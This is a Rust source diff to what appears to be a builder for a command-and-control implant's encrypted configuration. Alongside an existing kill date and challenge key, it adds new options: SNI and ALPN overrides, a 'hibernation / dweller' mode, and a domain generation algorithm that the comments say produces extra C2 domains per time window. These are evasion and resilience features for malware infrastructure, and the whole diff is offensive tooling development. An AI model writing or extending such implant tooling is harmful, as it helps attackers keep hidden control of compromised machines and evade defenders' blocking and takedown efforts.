@@ -39,6 +39,22 @@ struct Cli {
     #[arg(long, default_value_t = 0)] bloat: u64,
     #[arg(long, default_value_t = false)] debug: bool,
     #[arg(long, default_value_t = 0)] days: i64,
+    // ── Feature 1: SNI / ALPN overrides ───────────────────────────────
+    #[arg(long)] sni_override: Option<String>,
+    #[arg(long, value_delimiter = ',')] alpn_protocols: Vec<String>,
+    // ── Feature 3: Hibernation / dweller mode ─────────────────────────
+    #[arg(long, default_value_t = false)] hibernation: bool,
+    #[arg(long, default_value_t = 1)] batch_size: u32,
+    // ── DGA: domain generation algorithm ──────────────────────────────
+    /// Embed a DGA seed. When set, the agent generates extra C2 domains
+    /// each window rather than relying solely on configured endpoints.
+    #[arg(long)] dga_seed: Option<u64>,
+    /// DGA window length in seconds (default 86400 = 1 day).
+    #[arg(long, default_value_t = 86400)] dga_window: u64,
+    /// Number of DGA domains per window (default 16).
+    #[arg(long, default_value_t = 16)] dga_count: u32,
+    /// Comma-separated TLD list for DGA (default "com,net,org").
+    #[arg(long, default_value = "com,net,org")] dga_tlds: String,
 }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
@@ -280,7 +296,17 @@ fn main() -> Result<()> {
         "hash_salt": hash_salt,
         "build_id": build_id,
         "kill_date": kill_ts,
-        "challenge_key": challenge_key_b64
+        "challenge_key": challenge_key_b64,
+        "sni_override":   cli.sni_override,
+        "alpn_protocols": cli.alpn_protocols,
+        "hibernation_mode": cli.hibernation,
+        "batch_size":     cli.batch_size,
+        "dga": cli.dga_seed.map(|seed| serde_json::json!({
+            "seed":        seed,
+            "window_secs": cli.dga_window,
+            "count":       cli.dga_count,
+            "tlds":        cli.dga_tlds.split(',').collect::<Vec<_>>()
+        }))
     }).to_string();
 
     println!("[*] Encrypting configuration...");
